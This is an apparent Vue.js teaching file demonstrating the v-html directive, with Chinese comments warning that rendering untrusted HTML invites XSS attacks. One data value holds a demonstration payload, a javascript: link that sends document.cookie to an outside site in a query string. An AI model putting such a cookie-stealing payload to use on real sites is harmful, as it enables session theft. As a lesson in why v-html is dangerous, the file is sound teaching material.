<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../vue.js"></script>
</head>

<body>
    <!-- 
        v-html指令：
            1.作用：向指定节点渲染包含html结构的内容
            2.与插值语法的区别：
                    (1).v-html会替换掉节点中所有的内容，插值语法{{xxx}}不会
                    (2).v-html可以识别HTML结构
            3.严重注意：v-html有安全性问题
                    (1).在网站上动态渲染任意html是非常危险的，容易导致xss攻击
                    (2).一定要在可信的内容上使用v-html，永远不要在用户提交的内容
     -->
    <div id="root">
        <h2>{{name}}</h2>
        <h2 v-html="str"></h2>
        <h2 v-html="str2"></h2>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                name: '你好',
                str: '<h3>你好</h3>',
                str2: '<a href=javascript:location="http://www.baidu.com?"+document.cookie>你好</a>'
            }
        })
    </script>
</body>

</html>
